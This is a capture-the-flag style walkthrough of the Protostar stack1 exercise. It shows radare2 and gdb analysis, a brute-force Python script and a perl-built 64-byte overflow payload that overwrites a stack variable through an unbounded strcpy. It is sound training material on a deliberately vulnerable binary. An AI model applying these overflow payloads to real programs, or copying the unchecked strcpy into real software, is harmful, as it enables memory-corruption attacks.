# Protostar Stack1
## Static Analysis
##### Analyse the binary
`r2 -A stack1`
##### Symbols
```
[0x080483b0]> is
[Symbols]
// removed most entries for Brevity
068 0x00000464 0x08048464 GLOBAL   FUNC  115 main
003 0x00000368 0x08048368 GLOBAL   FUNC   16 imp.strcpy
004 0x00000378 0x08048378 GLOBAL   FUNC   16 imp.printf
005 0x00000388 0x08048388 GLOBAL   FUNC   16 imp.errx
006 0x00000398 0x08048398 GLOBAL   FUNC   16 imp.puts
```
##### Familiarity
```
[0x1000015f0]> i
file     stack1
arch     x86
endian   little
```
##### Interesting Strings
```
[0x080483b0]> fs strings;f
0x080485a0 28 str.please_specify_an_argument
0x080485bc 55 str.you_have_correctly_got_the_variable_to_the_right_value
0x080485f3 27 str.Try_again__you_got_0x_08x
```
##### Stack Variables
```
[0x080483b0]> pdf @main
/ (fcn) main 115
|   main (unsigned int arg_8h, int arg_ch);
|           ; arg unsigned int arg_8h @ ebp+0x8
|           ; arg int arg_ch @ ebp+0xc
|           ; var char *src @ esp+0x4
|           ; var char *dest @ esp+0x1c
|           ; var int local_5ch @ esp+0x5c
```
##### Calculate Destination Buffer size
```
var char *dest @ esp+0x1c
var int local_5ch @ esp+0x5c

[0x00000040]> ?vi 0x5c - 0x1c
64

// Same code works in Python
>>> 0x5c - 0x1c
64
```
##### Find Compare instruction
```
0x080484ab      3d64636261     cmp eax, 0x61626364         ; 'dcba'

// EAX,AX,AH,AL : used for I/O port access, arithmetic, interrupt calls,  etc...
```
## strcpy
`man strcpy` tells you:
> SECURITY CONSIDERATIONS
>      The strcpy() function is easily misused in a manner
>      which enables malicious users to arbitrarily change a
>      running program's functionality through a buffer
>      overflow attack.

## Run vulnerable code
```
$ cd /opt/protostar/bin/      
$ ./stack1
stack1: please specify an argument

$ ./stack1 aaaa
Try again, you got 0x00000000

$ ./stack1 AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
Try again, you got 0x00000000
```
##### Brute Force script
```
#!/usr/bin/env python
import os.path

STACK1_BINARY="/opt/protostar/bin/stack1"
MAX_CHARS = 70

if __name__ == "__main__":
    if os.path.isfile(STACK1_BINARY):
        for i in range(1, MAX_CHARS):  # type: int
            test_str = "A" * i

            exit_code = os.system('%s %s' % (STACK1_BINARY, test_str))
            if exit_code != 0:
                print('[*] Error code : ' + str(exit_code) + '\t when passing: ' + str(i) + ' chars')
                exit(exit_code)
    else:
        print('[*] file does not exit')

///////////////////////

Try again, you got 0x00000000
Try again, you got 0x00000000
Try again, you got 0x00000000
Try again, you got 0x00000000
[*] Error code : 6	 when passing: 72 chars

// Code 6 = running this code on MacOS.
// MacOS auto-added stack protections and it detected the Buffer Overflow and quit the app.
```
##### Re-Analyse program
```
$ i=70 | seq -sA $i|tr -d '[:digit:]'

$ ./stack1 AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
Try again, you got 0x41414141

//Overflow starts at Char 65
$ ./stack1 AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA    
Try again, you got 0x00000041

```
## Debugger
```
(gdb) set disassembly-flavor intel

(gdb) file stack0
Reading symbols from /opt/protostar/bin/stack0...done.

```
#### Breakpoint
Find the offset address that moves Stack Integer into Register:
```
0x080484a7      8b44245c       mov eax, sword [local_5ch]  ; [0x5c:4]=-1 ; '\' ; 92

(gdb)b *0x080484a7

(gdb) r

(gdb) info breakpoints
Num     Type           Disp Enb Address    What
4       breakpoint     keep y   0x080484a7 in main at stack1/stack1.c:18

Breakpoint 4, main (argc=2, argv=0xbffffd24) at stack1/stack1.c:18
18	in stack1/stack1.c
(gdb) x/i $pc
0x80484a7 <main+67>:	mov    eax,DWORD PTR [esp+0x5c]

(gdb) define hook-stop
>x/24wx $esp
>end
(gdb) r
```
##### Set the Overflow
```
(gdb) set args "`perl -e 'print "A"x65;'`"
0xbffffc10:	0xbffffc2c	0xbffffe50	0xb7fff8f8	0xb7f0186e
0xbffffc20:	0xb7fd7ff4	0xb7ec6165	0xbffffc38	0x41414141
0xbffffc30:	0x41414141	0x41414141	0x41414141	0x41414141
0xbffffc40:	0x41414141	0x41414141	0x41414141	0x41414141
0xbffffc50:	0x41414141	0x41414141	0x41414141	0x41414141
0xbffffc60:	0x41414141	0x41414141	0x41414141	0x00000041

(gdb) set args "`perl -e 'print "a"x64 . "\x64\x63\x62\x61";'`"
0xbffffc10:	0xbffffc2c	0xbffffe4d	0xb7fff8f8	0xb7f0186e
0xbffffc20:	0xb7fd7ff4	0xb7ec6165	0xbffffc38	0x61616161
0xbffffc30:	0x61616161	0x61616161	0x61616161	0x61616161
0xbffffc40:	0x61616161	0x61616161	0x61616161	0x61616161
0xbffffc50:	0x61616161	0x61616161	0x61616161	0x61616161
0xbffffc60:	0x61616161	0x61616161	0x61616161	0x61626364

(gdb) c

// you have correctly got the variable to the right value
```
## Source code
```
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>
#include <err.h>  // I had to manually add this..

int main(int argc, char **argv)
{
  volatile int modified;
  char buffer[64];

  if(argc == 1) {
      errx(1, "please specify an argument\n");
  }

  modified = 0;
  strcpy(buffer, argv[1]);

  if(modified == 0x61626364) {
      printf("you have correctly got the variable to the right value\n");
  } else {
      printf("Try again, you got 0x%08x\n", modified);
  }
}
```
## Learnings
 - [x] If you run the code when the O/S has added in `Stack Protections` you still find clues to when an `Overflow` happens.
 - [x] During Static Analysis I observed the binary was written for a `Little Endian` system. That was important for how you constructed the overflow.  `\x64\x63\x62\x61 = dcba` worked.  If you tried `abcd` order you would have hit: `Try again, you got 0x64636261`.
